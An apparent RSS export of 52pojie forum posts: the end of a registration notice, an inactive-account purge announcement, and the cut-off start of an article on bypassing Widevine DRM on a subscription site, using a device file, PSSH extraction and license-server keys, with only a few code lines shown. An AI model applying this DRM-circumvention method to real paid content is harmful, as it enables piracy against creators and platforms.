initial;">庭</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">就</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">续</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">陆</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">导</span><span style="display: inline-block; text-indent: initial;">致</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">贩</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">倒</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">即</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">删</span><span style="display: inline-block; text-indent: initial;">除</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">珍</span><span style="display: inline-block; text-indent: initial;">惜</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">宝</span><span style="display: inline-block; text-indent: initial;">贵</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">给</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">欢</span><span style="display: inline-block; text-indent: initial;">声</span><span style="display: inline-block; text-indent: initial;">笑</span><span style="display: inline-block; text-indent: initial;">语</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">金</span><span style="display: inline-block; text-indent: initial;">钱</span><span style="display: inline-block; text-indent: initial;">衡</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">愉</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li></ul><p><br /></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">（</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">）</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">公</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">台</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">“721</span><span style="display: inline-block; text-indent: initial;">福</span><span style="display: inline-block; text-indent: initial;">利</span><span style="display: inline-block; text-indent: initial;">”</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">周一7</span></strong><span style="display: inline-block; text-indent: initial;">月15</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币，防止错过开放注册，强烈建议设置“星标”</span><span style="display: inline-block; text-indent: initial;">。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><br /></strong></span></p><p><em><span style="color: rgb(136, 136, 136); font-size: 14px;"></span></em><em style="letter-spacing: 0.544px;"><span style="color: rgb(136, 136, 136); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">居</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">按</span><span style="display: inline-block; text-indent: initial;">照</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">求</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">截</span><span style="display: inline-block; text-indent: initial;">图</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">也</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">所</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">哦</span><span style="display: inline-block; text-indent: initial;">。</span></span></em></p><p><br /></p><p style="margin-bottom: 0px; color: rgb(53, 53, 53); text-align: start; letter-spacing: 0.544px; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1943355-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 12 Jul 2024 15:26:27 +0800</pubDate>
</item>
<item>
<title>【清理未活跃会员】清理2024年十六周年开放注册未活跃会员公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140996&amp;idx=1&amp;sn=e92617440c09db4799da299816cb1c37&amp;chksm=bd50a3d08a272ac6f1cf30c949bcf5d688cd6e9ed607c7fa4e47bf04b16c66711efef6268ded&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140996&amp;idx=1&amp;sn=e92617440c09db4799da299816cb1c37&amp;chksm=bd50a3d08a272ac6f1cf30c949bcf5d688cd6e9ed607c7fa4e47bf04b16c66711efef6268ded&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-09 18:17</span> <span style="display: inline-block;">北京</span>
</p>

<p>7月21日暑假开放注册即将到来，届时会提前发布公告通知。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=7e8718d4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIZ9LeISNic0eiborZl2TibpSqO6XGgLYicFPa1fFCbCbwiaTOagRt9pw6COK1JR1HoAwfNViaNgvt04Ceg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 15px;"><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=26462f88&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIZ9LeISNic0eiborZl2TibpSqJHmeWU2mfPNffnpv7M34sshSmbwibicTHSOwlLGiapuOTKK1smroG6GUQ%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;">吾爱破解论坛2024年十六周年开放注册一天四小时内共注册46677人！</span></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>为了保持论坛的活性，统计开放注册后就一直<span style="font-weight: 700;">未激活会员共1320位</span></p></li><li style="margin-left: 2px;"><p>激活后发帖和回帖总计不超过2贴的会员<span style="font-weight: 700;">35049名</span></p></li><li style="margin-left: 2px;"><p>注册一个月后就再也没有登录过的会员<span style="font-weight: 700;">773名</span></p></li></ul><li style="margin-left: 2px;"><p>以上未活跃用户今日账号<span style="font-weight: 700;">全部清除</span></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">清理前我们已经再三多次提醒过</span></span>，比如：</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册的时候强制十分钟阅读须知提醒</span></span><br /></p></li><li><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=aef7efd8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIZ9LeISNic0eiborZl2TibpSq1N2b20HGBkfbpnznjFnafvhsleCY3t9CfK3sjttUloVUdU6A4m9QsA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p></li><li style="margin-left: 2px;"><p><span style="font-weight: 700;"><span style="color: #ff0000;">注册后发送激活邮件中再次提醒</span></span><br /></p></li><li><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=1954d1c9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIZ9LeISNic0eiborZl2TibpSqhO8Wf4yV3WcoP0YjaHPUamSJan0SgzfW5GT4Mj3QnulnAAywoZSCvQ%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" /></p></li><li style="margin-left: 2px;"><p><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册后几天持续在论坛首页提醒</span></span><br /></p></li><li><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=13e561fa&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIZ9LeISNic0eiborZl2TibpSqsfpL20xGicvkymDG2OvJf8XDklUPgqerCuSRGaDf6hBVEMZuickR4nRA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册第二天官方公众号推送提醒</span></span></p></li><li><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=134981f5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIZ9LeISNic0eiborZl2TibpSqNwvicI9L12L3cpt8eicTOo26N8s9rNG4915k0UwnFGIR8OclHibc90BVg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" /></p></li></ul><li style="margin-left: 2px;"><p><span style="font-weight: 700;">最后统计有效注册人数为9382名，请多登陆发帖回帖保持活跃</span>。</p></li><li style="margin-left: 2px;"><p>其他还删除了几百个马甲账号和为贩卖账号注册的已激活账号和一些违规账号，在此不再一一告知，只做简单的陈述，欢迎大家发现此类账号在投诉举报区举报。</p></li></ul><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">大家珍惜自己的账号，还要防止账号被盗，保护好账号的安全，经常登陆论坛并发帖！</h3><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>论坛众多热心会员积极举报违规行为，来协助论坛管理团队的工作，在斑竹巡查的辛勤管理下，日益恢复正常，但是灌水的，冒充别人作品的，甚至投放木马的还是层出不穷，虽然论坛有很多反病毒工程师和管理团队，但是力量还是远远不够的，这里需要大家都参与到论坛秩序维护中来，维护论坛秩序人人有责，尽自己的一份力量，帮助维护论坛秩序，发现违规的帖子可以来投诉举报区投诉举报:https://www.52pojie.cn/forum-15-1.html</p></li><li style="margin-left: 2px;"><p><span style="font-weight: 700;">站点帮助文档：有问题一般在这里都能找到！</span><br />https://www.52pojie.cn/misc.php?mod=faq</p></li></ul><p><br /><span><span style="color: Red;"><span style="font-weight: 700;">7月21日暑假开放注册即将到来，届时会提前发布公告通知。</span></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1942412-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 09 Jul 2024 18:17:18 +0800</pubDate>
</item>
<item>
<title>【Web逆向】某OF网站的OB解密及DRM过校验思路(下)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140857&amp;idx=1&amp;sn=3407c95a363593d5c628215e655e05ae&amp;chksm=bd50a2ad8a272bbb162c9e1f6a68d9c040300934f87acc597bc82729405bc096b856529d3f18&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140857&amp;idx=1&amp;sn=3407c95a363593d5c628215e655e05ae&amp;chksm=bd50a2ad8a272bbb162c9e1f6a68d9c040300934f87acc597bc82729405bc096b856529d3f18&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-06 08:30</span> <span style="display: inline-block;">北京</span>
</p>

<p>虽然之前已经感谢过一次了，但是再次感谢videohelp论坛larley大神的解答！再次感谢吾爱破解论坛@涛之雨大神的帮助！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=704b8f9a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOOxicNwiblJTWBwLb4dUjfkVIHGb8oKhtJM7icW0zVnmjN5mEXFaHz3agw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>李恒道</strong></span><br /></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><br /></span></p><p>虽然之前已经感谢过一次了，但是</p><p>再次感谢videohelp论坛larley大神的解答！</p><p>再次感谢吾爱破解论坛@涛之雨大神的帮助！</p><p>之前我们已经成功拿到了wvd现在可以直接写代码了根据网络上的资料大致是首先拿到pssh，这个一般在mpd文件里<br /><img border="0" class="rich_pages wxw-img" height="277" src="https://wechat2rss.xlab.app/img-proxy/?k=8e844121&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOu052RzBy0Tw6CP62ibleAQnjTOBoAEldTlCfciavHutl751ibficgGA4oQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="881" /></p><p><br /><span>然后用cdm加载wvd</span><br /><span>cdm会根据wvd和ppsh请求证书服务器</span><br /><span>证书服务器会下发解密的密钥，然后用ffmpeg解密就可以了</span><br /><span>为了方便大家动手实践我先以https://bitmovin.com/demos/drm为例</span><br /><span>因为m3u8的ppsh不直观，就干脆后续下载mpd了</span><br /><span>代码如下</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> path = require(<span style="color: rgb(168, 255, 96);">'path'</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">YTDlpWrap</span> = require(<span style="color: rgb(168, 255, 96);">'yt-dlp-wrap'</span>).default;<br /><span style="color: rgb(150, 203, 254);">const</span> ytDlpWrap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">YTDlpWrap</span>(path.<span style="color: rgb(255, 255, 182);">join</span>(<span style="color: rgb(168, 255, 